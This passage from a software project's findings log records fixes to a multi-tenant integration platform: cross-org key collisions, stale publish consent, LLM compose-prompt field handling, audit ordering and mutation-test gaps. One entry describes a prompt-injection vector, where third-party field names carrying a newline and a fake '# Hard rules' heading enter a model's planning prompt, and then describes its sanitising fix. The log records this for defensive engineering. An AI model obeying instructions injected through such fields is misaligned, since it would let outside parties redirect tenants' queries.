  APP, and the measurement is now a committed case rather than a note: org A publishes a key; org B
  submits the same key; the reviewer's queue said `republish: false` with no `supersedes`, and the
  publish answered a clean 200 - while a THIRD org's `GET /api/v1/integrations` resolved that key to
  org A's package, because `getForActor` picks the OLDEST `global` row. Org A keeps answering for
  every consuming org, permanently, and org B's package is reachable by NO consumer. The reviewer
  approved a silent no-op with nothing in front of them that could have said so. `docs/decisions.md`'s "publishing a key that already has a live
  snapshot REPLACES it wholesale" is true within a row and false across orgs - and across orgs is the
  case the brief's "may replace the existing public one" is actually about.

  **DECIDED: A CROSS-ORG KEY COLLISION IS REFUSED, NOT SUPERSEDED**, and the alternative is worth
  recording because it is the tempting one. Letting the newer publication take the key would hand any
  tenant a way to seize a key another tenant owns and silently change what every consuming org
  resolves - executed by a platform admin who was shown nothing to suggest the key was taken. The
  refusal costs the challenger nothing they had: their own members already read their own row at any
  tier, and cross-org reach is the only thing refused, which is the thing they were never going to
  get. The escape hatch already exists and is exercised in the test: a super-admin demotes the
  incumbent (`{global:false}`) and the challenger then publishes into a free key.

  **AND `republish` WAS NOT REDEFINED**, which was the obvious move and the wrong one. Its row-lineage
  meaning is true and useful - it is what `supersedes` will record, and an un-published row awaiting
  re-review really does have a reviewed artifact to replace - so a per-key redefinition would have
  destroyed a real signal in order to carry a different one under its name. The reviewer now gets
  BOTH, separately: `republish` (this row's lineage) and `keyHeldBy` (the key's owner, present only on
  a collision, and its presence means approving will be refused). The dry run carries the same fact as
  a BARE boolean, `keyHeldByAnotherOrg`, because an author reads that response and a published package
  is anonymous by construction - the reviewer's surface is attributed, the author's is not.
  Implemented as `globalHoldersForKeys` beside `getForActor` and sharing its `oldestGlobalFirst`
  comparator, so the refusal cannot drift from the resolver it is a statement about. Verified by
  mutation: dropping the refusal reddens 1; dropping `keyHeldBy` from the queue projection reddens 1.

- **`s6-publishing-never-consumed-the-request-so-un-publishing-re-exposed-the-row`** (CLOSED
  2026-08-21, LOW-MEDIUM, cross-tenant exposure on a stale consent). `publishRequest` is what OPENS
  the E2 review window - `isDefinitionVisibleTo` shows an `org` row to a super-admin OUTSIDE the
  authoring org for exactly as long as the stamp is present - and `publishSnapshot` left it standing.
  Invisible while the row was `global` (a global row is visible to everyone anyway) and back the
  moment a super-admin un-published: the row landed on `org` still carrying the old stamp, so it was
  in the platform queue again and readable by every platform super-admin, on a consent the tenant gave
  for a publication that had ALREADY HAPPENED - while `definition-store.ts` claimed the window "is
  opened from inside the tenant". The contract suite could not see it because its two un-publish cases
  both RE-SUBMIT immediately, so the row was back in the queue for a legitimate reason. Closed by
  consuming the stamp inside `publishSnapshot`'s mutator (omitted, not set to `undefined`, which
  `replaceOne` would store as `null` and still satisfy the queue's `$exists`). The withdraw's own
  docblock is corrected on the way: it claimed the refusal on a `global` row protected the reviewer's
  ability to un-publish, and un-publishing never consulted the request. Verified by mutation:
  restoring the carried-forward stamp reddens 1.

- **`s6-actioncount-off-the-floor-is-an-equivalent-mutant-and-the-docblock-claimed-otherwise`**
  (CLOSED 2026-08-21, informational; a DOCBLOCK fixed, not code). `publishQueueEntry`'s comment said
  `actionCount` is "counted off the PUBLISHABLE action set so it answers 'how many actions would
  ship'", implying a distinction from counting `doc.actions`. There is none and there never has been:
  `publishableActions` is `actionsWithoutRecipes(...).map(...)` - both a `map`, neither a `filter` -
  so the projection has never dropped an action and the two counts are identical for every input. No
  test can tell them apart, and writing one that appears to would be the equivalent-mutant trap this
  slice has already logged twice. The code is unchanged, because reading off the floor is the right
  structure (a later projection that DOES drop an action is then counted correctly by where the value
  is read from), and the comment now says the number is the same today and why the line stays anyway.

- **`the-cross-org-pick-was-written-down-three-times-and-a-mutation-proved-it`** (CLOSED 2026-08-21,
  MEDIUM, list-versus-resolve divergence - found BY the mutation run, not by review). Which of several
  `global` rows a key resolves to is "oldest `createdAt` first, `orgId` as the tiebreak". It was
  implemented three times: inline in `IntegrationDefinitionStore.getForActor` (what a consuming org
  EXECUTES), in `definition-registry.ts`'s `sortGlobals` (what the same org SEES in its catalog), and
  - as of this round - in the new `globalHoldersForKeys` (what the publish door refuses against).
  `sortGlobals` carried a comment asserting it was "the SAME order `getForActor` uses", and the
  mechanism keeping that true was that someone had typed it out identically.

  **MEASURED: reversing the store's comparator left the entire suite GREEN.** That is the whole
  finding. A consuming org would have seen one tenant's package in `GET /api/v1/integrations` and
  executed another tenant's through `GET /api/v1/integrations/:key`, for the same key, with no test
  anywhere able to notice - and the publish door's new refusal would have been computed against a row
  other than the one actually shadowing the applicant. Closed by exporting `oldestGlobalFirst` from
  `definition-store.ts` and having the registry import it; the direction was already fixed by the
  documented cycle (the registry imports the store, never the reverse). The property is now pinned
  rather than the refactor: the third-org case asserts that the catalog and the by-key resolve name
  the same package. Verified by mutation: reversing the comparator now reddens 1 (it reddened 0
  before).

  **The general rule, and the reason this is worth a row:** "the same as X" in a comment over a
  duplicated implementation is a claim with no gate behind it, and mutation testing is what turns
  that from an opinion into a measurement. This one was found only because a mutant that SHOULD have
  reddened did not - which is the signal to chase rather than to shrug at.

- **`s6-un-publishing-a-shadowed-key-silently-swapped-every-tenants-package`** (CLOSED 2026-08-21,
  HIGH, unreviewed cross-tenant code swap - the LATENT half of the wrong-unit defect above, and the
  worse one). Refusing a cross-org collision at the publish door stops NEW pairs; it does nothing
  about the pairs already in the data, and `legacy-runtime-import.ts` and any in-process
  `IntegrationDefinitionStore.create({visibility:'global'})` can still make one. For such a pair the
  DEMOTION was the dangerous operation, not the publication. `getForActor` resolves one `global` row
  per key, so `{global:false}` on the holder promoted the shadowed row: every consuming org silently
  began resolving - and executing - a DIFFERENT tenant's package, at a moment when no reviewer was
  looking at that package, with no publication event and nothing recorded in any lineage. A reviewer
  performing a routine un-publish had no way to know they were performing a handover.

  **AND IT WAS NEVER AN UNFORESEEN STATE, which is the part worth saying plainly.** `getForActor`
  (definition-store.ts) falls through to "a `global` definition of that key authored in ANY other
  org", picked by a deterministic oldest-first sort with an `orgId` tiebreak. That sort EXISTS because
  several globals per key are possible. The RESOLVER always knew; the publish and review surfaces
  never did. This is a surface gap, not a surprise state - which is also why the fix belongs on the
  surfaces rather than in the resolver.

  Closed by making the demotion take the shadowed siblings with it (`demoteShadowedSiblings`, called
  from the single `setVisibility` chokepoint, so the tenant route and `{global:false}` both get it).
  `{global:false}` means this key stops being published, not "hand it to whoever is next in line", and
  each sibling must be published AGAIN to come back - which puts a review event exactly where there
  was none. Siblings are demoted BEFORE the target, deliberately: with no multi-document transactions
  the order decides the crash state, and stopping half way must leave the key MORE published rather
  than newly handed over. The write only ever narrows (`global -> org`, never `private`), so no tenant
  loses its own definition. Verified by mutation: dropping the sibling demotion reddens 1.

- **`the-oldest-first-global-pick-is-a-tiebreak-for-a-degenerate-state-not-an-ownership-rule`**
  (DECIDED 2026-08-21, informational - the question an independent verifier asked, answered rather
  than deferred). Asked whether oldest-first is the RIGHT ownership rule for a `global` key or merely
  the current one. **It is neither an ownership rule nor wrong: it is a deterministic tiebreak for a
  state the doors no longer create, and it is KEPT.** Ownership is now expressed by the doors - a row
  holds a key because it was published into a free key and stays the holder until it stops being
  `global` - and with the collision refused and the demotion taking siblings down, the door-driven
  population is at most one `global` row per key. What remains is data the doors did not write, and
  for that oldest-first is the right recovery order for two reasons, both about NOT moving:
  (1) it is stable under new writes, so a newly created row can never displace an incumbent by
  existing - which is the anti-squatting property the whole refusal is about; and (2) changing it
  (to newest-first, or to publication time) would itself silently swap which package every consuming
  org resolves for existing data, which is the defect above wearing a different hat. Re-documented at
  `oldestGlobalFirst` as what it is rather than as an ownership rule.

- **`s6-consuming-the-publish-request-broke-three-S1-fixtures-that-re-promoted-as-a-non-member`**
  (CLOSED 2026-08-21, informational; a REAL interaction found by rebasing onto main, not a flake).
  Rebasing this branch onto `aafba30` put it beside slice S1's action-evidence work, and three cases
  in another stream's files went red: `tests/integrations/action-resolution.test.ts` (2) and
  `tests/integrations/action-evidence-removal.test.ts` (1), all with `expected 'notfound' to be 'ok'`
  at a bare `setVisibility(id, superAdmin, 'global')`.

  **CAUSE, and it is this branch's change working as designed.** Those suites arrange "publish, then
  the author edits, then re-promote" and their `superAdmin` is `org-platform` - a NON-MEMBER. Since
  `publishSnapshot` consumes `publishRequest`, the un-publish leaves an `org` row with no standing
  request, so `isDefinitionVisibleTo` correctly stops showing it to a platform actor and the bare
  re-promotion answers the uniform `notfound`. That is precisely the exposure the change closes; the
  fixtures were relying on the window staying open after the consent was spent.

  **THE FIX IS THE ARRANGEMENT ACTOR, NOT THE ASSERTIONS, and the alternative was worse.** These
  cases cannot re-promote through the publish DOOR, because the door RE-SCRUBS and their whole point
  is that a consumer keeps resolving the artifact frozen BEFORE the author's edit - swapping in
  `publish()` would have made them pass while proving nothing, which is the substitution their own
  file header warns against. So the bare tier flip is performed by the authoring org's own
  super-admin, who can see the row without a standing request. That is also the more honest reading
  of a flip that deliberately does not re-scrub: an in-org operation rather than a cross-tenant
  platform act, and `tests/security/integration-publish-scrub.test.ts` already used an `inOrgAdmin`
  for exactly this. Every assertion in all three cases is untouched; only who performs the
  arrangement changed, with the reason written at the new actor. Re-run: 27/27 green.

  **AND A RESIDUAL, since the same rebase surfaced it.** `setVisibility(..., 'global')` at the STORE
  does not consume a standing request, where `publishSnapshot` does - so a bare store-level promotion
  can still leave a stale stamp on a `global` row. It is not reachable from a route (round three
  folded `{global:true}` into `publishDefinition`), so this is the same in-process-writer class as
  the legacy import, recorded rather than closed here.

- **`s5-compose-asked-the-model-to-invent-field-names`** (CLOSED 2026-08-21, HIGH, silent wrong
  answer on the rung's own canonical demo). `composeSections()` was the ONLY content the compose
  planning turn received, and it rendered four facts: the action's name, its one-line description,
  `changes data: no`, and the caller's collection NAMES. Not one field name, from either side.
  `composeOutputContract()` then demanded THREE of them back (`where.field`, `join.resultField`,
  `join.collectionField`), and `verifyComposePlan` accepted any non-empty string for each - so the
  model could only invent identifiers, and an invented identifier does not error. `matchesSimpleQuery`
  reads an absent field as `undefined`, which is a VALUE: under `lt`/`lte`/`gt`/`gte` it is `NaN` so
  nothing matches, under `neq` it is true for every row so the filter vanishes, and a wrong join key
  empties the key set. Every one of those came back `200 { outcome: "composed", items: [...],
  composition: {...} }` - well formed, confident, with a full narrowing report and NOTHING on the wire
  to distinguish it from a correct narrowing. For "todos os processos de clientes com menos de 40
  anos" the failure shape is a SHORTER LIST OF CASES, which a legal professional cannot tell from a
  correctly-filtered one by looking at it. Closed by moving the rung BELOW the execute (the only place
  the action's real row keys exist), showing both field sets in the prompt - the collection side from
  the new `CollectionsEngine.listCollectionFields`, the action side from `fieldsOf(rows)` - and making
  a name outside the shown sets a deterministic refusal of the PLAN, never of the call: the caller
  receives the executed arm's full answer with the offered set named in `ladder[].violations`.
  `composeRows` keeps its own floor for the collection side, judged against the rows the READER
  returned rather than what the LISTER advertised, because those are two separate queries. Journal:
  D-S5-5. Fourteen source mutants (both prompt lists, both suite checks, the stage floor and its
  capped-prefix scope, the collection resolution, `fieldsOf`'s union and sort, the engine's two sorts,
  and the four new stand-downs) all KILLED.

- **`s5-compose-where-value-accepted-any-json`** (CLOSED 2026-08-21, MEDIUM, same silent-wrong-answer
  family as the finding above, through the one door its fix does not cover). Every other thing a
  compose plan carries is a NAME, now chosen from a shown set. `where.value` is not - it is the
  model's own - and `verifyComposePlan` accepted anything, object or array included. `{ "$gt": 40 }`
  is exactly what a model that has seen a query language writes, and it fails the same silent way:
  `Number({...})` is `NaN` so the orderings match nothing; `eq`/`neq` compare by reference against a
  value that arrived over JSON, so `eq` never matches and `neq` always does (a filter that selects the
  whole collection); the string ops stringify it to `"[object Object]"`. `verifyPlannedArgs` has
  refused non-scalars since the parametrize rung shipped, for this exact reason. Closed with a `value`
  check of its own rather than a clause of `predicate`, so the ladder can say which of the two was
  wrong. `null` stays allowed - the recipe DSL compares against it today.

- **`s5-compose-emit-cap-boundary-was-never-pinned`** (CLOSED 2026-08-21, MEDIUM, a wire flag that
  lies in the direction that prompts action). `truncated: all.length > COMPOSE_MAX_ITEMS` could be
  mutated to `>=` with the whole estate green: round three built a boundary PAIR for the sibling
  constant `COMPOSE_MAX_COLLECTION_ROWS` and did not build one here, so the only case in the file was
  `MAX + 5`, true under both readings. Under `>=` a join matching EXACTLY 200 rows reports
  `truncated: true` while `items` holds every one of them, and a caller acting on that flag narrows a
  question that did not need narrowing, or tells their own client that a complete list is partial.
  Closed with the boundary pair at exactly `COMPOSE_MAX_ITEMS` and one past it.

- **`s5-the-compose-audit-write-was-a-guard-nobody-checked`** (CLOSED 2026-08-21, MEDIUM, the
  spent-answer defect's fourth exit, one step later than D-S5-4's). `applyComposition`'s header
  states the entire argument for its shape - "the only `await` outside the `try` is `auditComposed`,
  which catches its own" - and that was a claim about code no test exercised. Remove the catch and a
  rejecting `activityLogs.insert` propagates out of `applyComposition`, out of `runMatchedAction`,
  out of `achieveIntegrationGoal` and into the route's error handler as a 500: request goes out,
  comes back 200, the join is computed and CORRECT, our own audit collection blips, and the caller
  gets a 500 and no processos. The rows were not merely in hand - the whole narrowed answer existed
  and was destroyed by a write that is nobody's answer. Closed by injecting a rejection into
  `activityLogs.insert` for the compose row only; a blanket `mockRejectedValueOnce` catches the
  EXECUTOR's audit write instead, which is a different function with a catch of its own. While
  pinning it, a second unasserted field on the same exit: `filledArgs` could be deleted from the
  `composed` branch with the estate green, so an answer a model both filled arguments for AND
  narrowed reported only one of the two.

- **`s5-the-compose-prompt-is-larger-and-deliberately-uncapped`** (DISMISSED 2026-08-21, accepted
  characteristic, recorded rather than hidden). Showing the field sets widens the planning prompt by
  roughly the field count of every collection the caller holds, and that prompt is the input to a
  metered model call. A per-collection field CAP was considered and rejected: a truncated field list
  makes the refusal message FALSE - it would tell a caller that `idade` is not a field of their own
  `clients` - and a false statement about somebody's own data is worse than a longer prompt. The
  exposure is bounded by the store's own 256KB item-size cap, and it is one constant factor above the
  collection COUNT, which the prompt has carried unbounded since the rung shipped. Revisit if a real
  tenant's prompt approaches the model's context budget; the honest fix then is to narrow the
  COLLECTION list first (the rung joins exactly one), not to half-show a field list.

- **`s4-parametrize-rung-had-no-worker-recorder-split`** (CLOSED 2026-08-21, HIGH, a rung could end a
  call that would otherwise have executed). The compose rung got a worker/recorder split in round
  five (D-S5-4); the parametrize rung never did, and it sits ABOVE the one gated execute. Its seam
  calls were inline in `runMatchedAction` inside no `try`, and two reject in production - `checkAllowance`
  is three Mongo operations (`ensureAccount`, the lazy-reset write, `readGlobalOverageEnabled`), and
  `ctx.planStep` reaches the LLM chokepoint over a socket. A rejection left `runMatchedAction` before
  the action was called, left `achieveIntegrationGoal`, and reached the route as a 500: a trusted
  action, the caller's own arguments and a human's standing approval answered with an error envelope
  because a billing account read blipped. The compose rung's version of this destroys an answer
  already in hand; this one prevented the answer from ever being obtained. Closed with
  `parametrizeArgs` (recorder: one `try`, one ladder step, returns arguments - never a refusal, never
  a throw) over `draftParametrizedArgs` (worker: touches the seams, may throw, writes nothing), the
  same division `planComposition`/`draftCompositionPlan` and `applyComposition`/`attemptComposition`
  already have. `resolveCredentialEgressBinding` is NOT part of the fix and the code says why: it
  catches its own body and answers `refused` on any failure, deliberately, so it cannot reject.
  Journal: D-S4-3/D-S5-6. Mutants: removing the `try` and each of the rung's five stand-down verdicts,
  all KILLED.

- **`s4s5-an-infrastructure-rejection-read-as-a-deliberate-refusal`** (CLOSED 2026-08-21, HIGH, the
  platform told callers it had declined goals it had never looked at). `AchieveLadderStep.verdict`
  carried three words for four facts, and the mapping was wrong in both directions. The compose
  POST-STAGE recorded a REJECTED MONGO QUERY as `refused` - the platform stating it had considered
  the caller's goal and declined it, when the plan had passed every guardrail and a database had
  blipped. In the other direction, a billing-locked tenant, an unreachable model, an unresolvable
  credential and a rejected store read all read `skipped`, which is the word for "did not apply" and
  is what a caller is told when nothing went wrong; the billing branch's whole `detail` was the bare
  word `'billing'`, which is not a sentence anybody can act on. A caller cannot route on that:
  `refused` should send them to change their goal and everything else should send them to try again.
  Closed with a fourth verdict, `unavailable` ("we could not right now"), carrying no `violations`
  because nothing was judged - and with every branch that IS a judgement (unknown collection,
  unshaped result, a collection that drifted, both guardrail suites) deliberately left `refused`.
  Rule 7: a widening of a field no consumer has ever received, regenerated into openapi + cortex-cli
  in the same commit and safeParsed off the real wire by the contract suite. Journal: D-S4-3/D-S5-6.

- **`s5-third-party-field-names-entered-the-prompt-unbounded`** (CLOSED 2026-08-21, MEDIUM-HIGH,
  prompt-injection surface and a token bill somebody else chose the size of). D-S5-5 put both field
  sets into the compose planning prompt, and both are written by somebody who is neither the caller
  nor us: the ACTION side is a third-party HTTP API's own JSON keys, and the COLLECTION side is
  `app_data` field names, which - unlike collection NAMES, guarded on every write by
  `guardCollectionName` - pass no guard on ANY write path, so a served app ingesting an external feed
  writes that feed's keys verbatim. No length bound, no count bound, no charset: a key beginning with
  a newline and a `# Hard rules` heading renders as its own prompt section, and a response with ten
  thousand keys spends the caller's allowance on a prompt written by the remote. Closed with
  `promptSafeFields`: 100 names per side, at most 64 characters each, no C0/C1 control character, no
  DEL, no backtick. Applied where the sets are PRODUCED so the array the prompt renders is the array
  `verifyComposePlan` enforces - filtering only the prompt leaves a cosmetic guard, filtering only the
  suite refuses names the model was shown. Not a character allowlist: `número` and
  `Fälligkeitsdatum` are ordinary keys in this product's market. Journal: D-S4-3/D-S5-6.

- **`s5-compose-prompt-field-cap`** (DISMISSAL OVERTURNED 2026-08-21). Last round,
  `s5-the-compose-prompt-is-larger-and-deliberately-uncapped` above
  dismissed a per-collection field cap, on the grounds that a truncated list makes the
  refusal message FALSE - it would tell a caller that `idade` is not a field of their own `clients`
  collection, and a false statement about somebody's own data is worse than a long prompt. The
  reasoning about the MESSAGE was right and is answered rather than ignored; what the dismissal did
  not weigh is that the same list is a third-party-writable injection surface, which changes the
  balance. So the cap exists now, and the objection is closed on its own terms: the three field
  refusals state OFFEREDNESS ("is not among the fields offered for …") instead of existence, which is
  the claim the platform can support once a set can legitimately be a subset. A test drives a real
  field dropped by the sanitiser through the suite and requires the message not to deny it exists.
  The dismissal's own fallback advice ("narrow the COLLECTION list first, not to half-show a field
  list") remains the right next move if a real tenant's prompt approaches the context budget.

- **`s5-listcollectionfields-empty-fields-claim-is-unexercisable`** (CLOSED 2026-08-21, LOW, a comment
  stating a consequence nothing proves). `listCollectionFields`' `preserveNullAndEmptyArrays: true`
  carried the claim that "a collection whose rows carry no fields at all still appears, with an empty
  `fields`". Deleting the option leaves the entire estate green, and no honest fixture can change
  that: `create`, `importCreate` and both branches of `upsert` build `item` as
  `{ id, createdAt, updatedAt, ...fields }`, so no row this engine has ever written is fieldless, and
  a fixture would have to reach past the engine to the driver. Closed by CORRECTING THE STATEMENT
  rather than by writing that fixture - the option stays as a defensive default, documented as one,
  and the two renderings that inherit its unreachability (`composeSections`' `(no fields)`,
  `verifyComposePlan`'s `'none'`) are labelled with the same status.

- **`s4-render-check-claimed-a-coded-refusal-that-cannot-exist`** (CLOSED 2026-08-21, LOW, same
  class). `action-parametrize.ts`'s `render` check claimed the rung "refuses with a coded refusal the
  caller can act on". Since the discard rule landed there is no such refusal on this path and there
  cannot be one: the ladder introduces no `AchieveRefusalCode` at all, and its own suite pins that by
  counting them. Corrected to what the check actually buys, which is better than the claim it
  replaced: without it a re-authoritied path argument is merged and the EXECUTOR refuses the call, so
  the caller's own good request fails because a model wrote a bad argument; with it the plan is
  dropped before the write gate and before any credential is decrypted, and the caller keeps their
  answer.

- **`s4s5-the-two-prompt-bound-tests-were-tautologies`** (CLOSED 2026-08-21, MEDIUM, a method defect
  worth recording because it will recur). The first version of the `COMPOSE_MAX_FIELD_NAME_CHARS` and
  `COMPOSE_MAX_FIELDS` boundary tests built their fixtures FROM the constants
  (`'f'.repeat(COMPOSE_MAX_FIELD_NAME_CHARS)`), so the fixture moved with the bound and the assertion
  could not fail: `64 -> 63`, `64 -> 65`, `100 -> 99` and `100 -> 101` all SURVIVED a sweep that was
  run specifically to kill them. A bound asserted against itself is not a bound. Both are rewritten
  with literals, with the constant checked against the literal beside them. Recorded because the
  tautology is invisible on reading and only a mutation sweep finds it.

- **`s4s5-the-compose-rungs-answer-did-not-survive-the-generated-client`** (**FIXED 2026-08-21**,
  S4/S5 round eight, was BLOCKER; see `docs/decisions.md` D-S4-4/D-S5-7). `cortex integrations
  achieve` read `body.outcome === 'executed'` alone and treated everything else as "nothing ran", so
  a `composed` answer - a trusted read that RAN, whose rows were then narrowed against one of the
  caller's own collections, minting nothing - exited 1 with the code `authored` and the sentence "was
  written ... as provisional and has NOT run", stdout EMPTY. Seven rounds made the rung correct at
  the route and it was destroyed one layer out.
  THE REAL FINDING IS THE TESTING GAP, and it is what the fix has to close: the route is not the
  product's edge. Capabilities are exposed as versioned public APIs consumed by ordinary API clients
  (Rule 1, Rule 3) and this repo SHIPS one, but both ladder suites stopped at `buildApp` and
  `clients/cortex-cli/tests/e2e.test.ts` never touched `achieve` beyond its refusal paths - so
  nothing in the estate could have caught it. NEW FILE
  `clients/cortex-cli/tests/achieve-ladder.e2e.test.ts`: the ladder end to end through the BUILT
  binary against `buildApp`, and the standing rule that follows it - a rung whose answer is correct
  at the route and wrong at the client is wrong.
  PROVEN BY MUTATION: restoring the one-outcome branch reds three of its cases; dropping `result`
  from the ROUTE's composed projection leaves the module suite green and reds the contract and client
  suites, which is the layer gap stated as a test result.

- **`s4s5-the-composed-answer-discarded-the-actions-response-envelope`** (**FIXED 2026-08-21**,
  S4/S5 round eight, was MAJOR; same journal entry). The composed exit carried `items` and nothing of
  what produced them, so the action's ENVELOPE was destroyed by a stage that only ever meant to ADD a
  narrowing: the executor's verdict, the upstream status, and every field standing BESIDE the list
  inside `data`. An upstream answering `206 { processos: [...], nextPage }` came back as
  `{ outcome: 'composed', items: [...], composition: { scanned: 4 } }` - one PAGE of somebody's
  processes, indistinguishable from all of them, with a narrowing report implying 4 was the whole.
  Same family as the spent-200 defect, one field down. `result` now rides `composed` exactly as it
  rides `executed`, and the rows travel WHOLE rather than substituted: putting the narrowed list back
  under the third party's own key would hand a caller a document it never emitted.
  PROVEN BY MUTATION at both layers, module and route, separately.

- **`s4s5-a-model-chosen-value-on-a-write-was-visible-to-nobody`** (**FIXED 2026-08-21**, S4/S5 round
  eight, was MINOR x2 - one defect from two sides; same journal entry). D1 lets a model fill a
  WRITE's body arguments, so a model can choose the `titulo` a peça is filed under. Where that value
  was recorded: nowhere. `capability_execute` logs a verdict and a duration and no arguments, the 200
  carries `filledArgs` as NAMES, and the request is a socket write this platform keeps no copy of -
  and the `awaiting_consent` 403, the ONE moment a human is in the loop and fired BEFORE the request
  goes out, carried the descriptor alone: not which rung produced the call, not one argument a model
  had put in it. The approving human and the later auditor were both shown a shrug. FIXED as one
  thing: the 403's `details` gains `ladder`, `filledArgs` and `filledArgValues` (typed by the new
  shared `AchieveConsentDetails`, printed by `cortex-cli` at the gate), and a new activity type
  `capability_achieve_parametrize` records the VALUES durably, whatever the call then did - a gate
  that held is as much an audit fact as a write that went. The 200 stays names-only; its old
  justification ("the values are in the request that was sent") was corrected, because that request
  is one the caller never sees.
  PROVEN BY MUTATION: the contract suite asserts the value in the REQUEST BODY the third party
  received and the value in the durable row are the same one, and each field of each is separately
  killable.

- **`s4s5-the-shipped-skill-doc-described-the-pre-compose-contract`** (**FIXED 2026-08-21**, S4/S5
  round nine, was MAJOR; journal D-S4-5/D-S5-8). `clients/cortex-cli/SKILL.md` said "`achieve` has
  three outcomes and only one of them is exit 0" with a three-row table, while `composed` was already
  in the schema, the OpenAPI spec, the generated client, the route and - since round eight - this
  command's own exit-0 branch. SKILL.md is the document an AGENT reads to decide how to use the
  command, so a stale contract there is a wrong INSTRUCTION shipped to every consumer: an agent
  believing it treats a successful narrowed read as a failed goal, which is exactly the defect the
  client itself had one round earlier. Same class as the route docblock and the descriptor on the
  sibling branch - the code moved and the thing people read did not.
  FIXED by testing the doc instead of proof-reading it: what outcomes exist is read from
  `docs/openapi/cortex.v1.json`, and the exit code each row claims is compared against the exit code
  the BINARY really produces for that outcome, so neither side can drift alone.
  PROVEN BY MUTATION in both directions - deleting the `composed` row reds, and changing its stated
  exit to 1 reds against the running command.

- **`s4s5-human-mode-composed-dropped-the-envelope-so-a-paginated-200-read-as-the-whole-answer`**
  (**FIXED 2026-08-21**, S4/S5 round nine, was MAJOR; same journal entry). The third variant of this
  rung's sharpest defect and the most dangerous, because the caller cannot see it. Round eight put
  the arm's whole answer on `result` at the module, projected it at the route and printed it under
  `--json`; `printComposedResult` printed `items` alone, so every field standing BESIDE the list
  inside `data` - a `nextPage` cursor above all - never reached the one reader who cannot go and look
  it up. The composed line tells them the rows were NARROWED; nothing told them what they were
  narrowed FROM was itself one page, so a join over the first page of a paginated read printed
  identically to the same join over the whole of it - and for "todos os processos de clientes com
  menos de 40 anos" that is a lawyer reading a partial case list as the full one. FIXED by printing the action's own answer whole,
  labelled, ABOVE the rows (`items` is capped at 200, and a partiality signal under 200 rows of JSON
  is a signal nobody reads), and nothing on it summarised - choosing which siblings of the list
  matter would mean guessing which key a given third party paginates with.
  PROVEN BY MUTATION against a fixture answering HTTP **200** with a cursor, which is the dangerous
  case: a 206 announces itself in the status line, a paginated 200 announces itself nowhere else.

- **`s4s5-the-record-of-a-model-chosen-value-was-written-after-the-write-and-swallowed`**
  (**FIXED 2026-08-21**, S4/S5 round nine, was MINOR but the sharpest one; same journal entry).
  `capability_achieve_parametrize` is the only durable record that a MODEL, rather than the person or
  script holding the key, decided what a third-party call would act on - and it was awaited AFTER the
  one gated execute inside its own `catch`. So the audit trail for "what did the model pick for this
  write" could be silently absent EXACTLY when the write had succeeded: missing precisely on the runs
  that mattered, which is not a trail. FIXED by writing it BEFORE the execute and not catching:
  nothing has been spent at that point, so the failure has somewhere to go that is neither silence
  nor a destroyed answer. Refusing the call would have been the other defect this branch spent three
  rounds closing, so the rung STANDS DOWN instead - the model's arguments are dropped, the request
  goes out as the CALLER shaped it, the ladder says `unavailable`, and the answer arrives whole. The
  record of the choice is a precondition of the choice. `verdict`/`code` leave the row (they are
  `capability_execute`'s own fact for the same call, one insert later, and were the only reason this
  row had to wait for a write to finish).
  PROVEN BY MUTATION: the ORDER is asserted as a sequence (`capability_achieve_parametrize` ->
  the third-party call -> `capability_execute`), and moving the write back below the execute reds
  that and nothing else in the estate; swallowing instead of standing down reds the case that
  asserts the model's value never left the process.

- **`s4s5-composition-scanned-was-unpinned-across-the-whole-estate`** (**FIXED 2026-08-21**, S4/S5
  round nine, was MINOR; same journal entry). Every fixture held four action rows and four collection
  rows, so `scanned` could not be told from `collectionScanned`, nor `matched` from
  `matchedCollectionRows`: no assertion anywhere could say which SIDE of the join a count was
  counting, and a summary reporting the caller's collection size as the action's page size was green
  everywhere. FIXED with a fifth client that satisfies the predicate and keys no process, in all
  three fixtures, so the canonical answer is scanned 4 / collectionScanned 5 / matchedCollectionRows
  3 / matched 2 - four counts, four different numbers, at the pure stage, on the wire and through
  the client.

- **`s4s5-the-humans-only-truncation-warning-had-no-test`** (**FIXED 2026-08-21**, S4/S5 round nine,
  was MINOR; same journal entry). `- PART of the answer, not all of it` is the one thing on screen
  that says a narrowed list is not the whole of somebody's answer, and it could be deleted, inverted
  or reduced to one of its two flags with the estate green - same family as the envelope defect
  above. FIXED with a four-row table of the rendering (each flag alone, both, neither) plus an
  end-to-end case driving 201 real rows through the real join stage, so `truncated` is set by
  `composeRows` counting past its own emit cap rather than by a fixture asserting itself.

- **`s4s5-mint-and-ladder-on-a-refusal-were-published-and-populated-by-nothing`**
  (**FIXED 2026-08-21**, S4/S5 round nine, was MINOR; same journal entry). `AchieveRung` published
  the word `mint` and nothing pushed it; `AchieveResult` declared `ladder` on `authored` and on
  `refused` and no call site passed it. A vocabulary a server publishes and never emits is a contract
  the code does not have. FIXED per field: the author arm IS the mint rung and now says so
  (`authored` carries `reuse` `skipped` then `mint` `taken`, and `ladder` is REQUIRED there), while
  `ladder` is REMOVED from the refused variant rather than left declared-and-empty - a refusal is the
  answer that no rung produced anything, and the type now has nowhere to put one.

- **`s4s5-promptsafefields-ordering-was-unpinned`** (**FIXED 2026-08-21**, S4/S5 round nine, was
  MINOR - and the review's stated reason for it is CORRECTED rather than repeated; same journal
  entry). The order of `filter` and `slice` was unpinned and could be reversed with the estate green.
  It is NOT what stops an unsafe field name reaching the prompt: `.slice().filter()` sanitises
  everything it emits exactly as `.filter().slice()` does, and no name the predicate rejects reaches
  a system prompt under either order. What it stops is a THIRD PARTY DECIDING WHAT A TENANT MAY
  NARROW BY: capping first spends the 100 slots on the raw list, so a remote emitting a hundred
  control-charactered keys - which sort first, both sets arriving sorted - leaves the caller an EMPTY
  offered set. The docblock now states that consequence and disclaims the injection one; the test is
  a 100-refused + 100-good fixture that reads `[]` under the reversed order.

- **`s3-a-bare-pasted-credential-in-note-prose-is-outside-the-value-anchored-floor`** (OPEN, MINOR,
  2026-08-22, slice S3; journal entry `S3: a person's own notes about an action`). `scrubSecretText`
  is the read-path egress floor for every free-text body that reaches a prompt, and it is
  VALUE-ANCHORED on purpose: it redacts the value of a credential-named key (`api_key: …`) and the
  text after an auth scheme word (`Bearer …`), so that documentation OF those field names survives
  rather than coming back shredded (the A3 re-review LOW-2/LOW-3 note in `definitions.ts`). A token
  pasted into an unanchored sentence - "a chave e sk_live_…" - is outside it. NOT introduced by this
  slice: the identical gap applies to the `lessons` body that shares the floor, and to `SKILL.md`.
  It is recorded here because S3 multiplies the SURFACE (a note per person, per action, per step) and
  because a reader of the S3 suites would otherwise reasonably conclude a note cannot carry a
  credential out. Pinned in both directions by
